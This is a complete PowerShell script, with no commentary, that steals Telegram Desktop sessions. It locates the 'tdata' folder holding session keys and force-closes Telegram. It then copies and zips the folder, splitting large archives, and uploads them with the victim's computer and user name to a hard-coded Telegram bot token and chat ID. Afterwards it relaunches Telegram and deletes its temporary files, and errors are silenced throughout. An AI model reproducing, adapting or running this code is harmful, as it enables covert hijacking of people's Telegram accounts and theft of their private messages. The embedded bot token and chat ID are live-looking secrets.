param([string]$Token, [string]$ChatID)
$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference    = 'SilentlyContinue'
if (-not $Token)  { $Token  = '9144321837:AAHrcLLsQqlZGQNXFdry99NnBKfTIHLCK90' }
if (-not $ChatID) { $ChatID = '1859879540' }

$apiDoc = "https://api.telegram.org/bot$Token/sendDocument"
$apiMsg = "https://api.telegram.org/bot$Token/sendMessage"
$curl   = (Get-Command curl.exe -ErrorAction SilentlyContinue).Source
$stamp  = Get-Date -Format 'yyyyMMdd_HHmmss'
$cap    = "$env:COMPUTERNAME | $env:USERNAME | $stamp"

function Send-Text([string]$text) {
    if ($curl) {
        & $curl -s --max-time 20 --data-urlencode "text=$text" -d "chat_id=$ChatID" $apiMsg | Out-Null
        return
    }
    Invoke-RestMethod -Method Post -Uri $apiMsg -Body @{ chat_id = $ChatID; text = $text } | Out-Null
}

function Post([string]$file, [string]$text) {
    if ($curl) {
        & $curl -s --max-time 180 -F "document=@$file" -F "caption=$text" $apiDoc | Out-Null
        return
    }
    Add-Type -AssemblyName System.Net.Http
    $hc = New-Object System.Net.Http.HttpClient
    $mp = New-Object System.Net.Http.MultipartFormDataContent
    $fs = [IO.File]::OpenRead($file)
    $sc = New-Object System.Net.Http.StreamContent($fs)
    $mp.Add($sc, 'document', [IO.Path]::GetFileName($file))
    $mp.Add((New-Object System.Net.Http.StringContent($text)), 'caption')
    $hc.PostAsync($apiDoc, $mp).GetAwaiter().GetResult() | Out-Null
    $fs.Dispose(); $mp.Dispose(); $hc.Dispose()
}

function Send-Large([string]$path, [string]$text) {
    $limit = 45MB
    if ((Get-Item $path).Length -le $limit) { Post $path $text; return }
    $fs = [IO.File]::OpenRead($path); $i = 0
    try {
        while ($fs.Position -lt $fs.Length) {
            $part = "$path.part$i"
            $out  = [IO.File]::Create($part)
            try {
                $left = $limit; $buf = New-Object byte[] (1MB)
                while ($left -gt 0 -and $fs.Position -lt $fs.Length) {
                    $n = $fs.Read($buf, 0, [Math]::Min($buf.Length, $left))
                    if ($n -le 0) { break }
                    $out.Write($buf, 0, $n); $left -= $n
                }
            } finally { $out.Close() }
            Post $part "$text [part $i]"
            Remove-Item $part -Force
            $i++
        }
    } finally { $fs.Close() }
}

Send-Text "start: $cap"

$cands = @()
$cands += Join-Path $env:APPDATA 'Telegram Desktop\tdata'
$cands += 'C:\Telegram\tdata'
$cands += Join-Path $env:USERPROFILE 'Downloads\Telegram\tdata'
$proc = Get-Process Telegram -ErrorAction SilentlyContinue | Select-Object -First 1
if ($proc -and $proc.Path) { $cands += Join-Path (Split-Path $proc.Path) 'tdata' }
Get-ChildItem (Join-Path $env:LOCALAPPDATA 'Packages') -Filter 'Telegram*' -Directory -ErrorAction SilentlyContinue | ForEach-Object {
    $cands += Join-Path $_.FullName 'LocalCache\Roaming\Telegram Desktop\tdata'
}
$cands = $cands | Select-Object -Unique

$src = $cands | Where-Object { Test-Path (Join-Path $_ 'key_datas') } | Select-Object -First 1
if (-not $src) { Send-Text "no tdata: $cap"; exit }

$exe = Join-Path (Split-Path $src) 'Telegram.exe'

Stop-Process -Name Telegram -Force
$n = 0
while ((Get-Process Telegram -ErrorAction SilentlyContinue) -and $n -lt 15) {
    Start-Sleep -Milliseconds 1000
    $n++
}

$out = Join-Path $env:TEMP "td_$stamp"
$zip = "$out.zip"
robocopy $src $out /E /XD cache /NFL /NDL /NJH /NJS /R:1 /W:1 | Out-Null

if (Test-Path (Join-Path $out 'key_datas')) {
    Compress-Archive (Join-Path $out '*') $zip -Force
    Send-Large $zip "$cap | $([Math]::Round((Get-Item $zip).Length/1MB,2))MB"
} else {
    Send-Text "copy failed: $cap"
}

if (Test-Path $exe) { Start-Process $exe }
Remove-Item $out -Recurse -Force
Remove-Item $zip -Force
